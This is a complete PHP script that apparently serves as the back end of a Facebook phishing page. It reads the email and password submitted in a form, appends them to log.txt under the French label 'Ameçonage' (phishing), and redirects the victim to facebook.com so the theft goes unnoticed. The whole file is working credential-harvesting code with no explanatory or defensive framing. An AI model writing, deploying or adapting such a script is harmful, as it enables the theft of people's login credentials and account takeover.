<?php 

$user_email = htmlspecialchars($_POST['email']);
$user_password = htmlspecialchars($_POST['pass']);

$file = fopen("log.txt", "a+");

fprintf($file, "Ameçonage : %s %s".PHP_EOL, $user_email, $user_password);
fclose($file);

header('location: https://www.facebook.com/');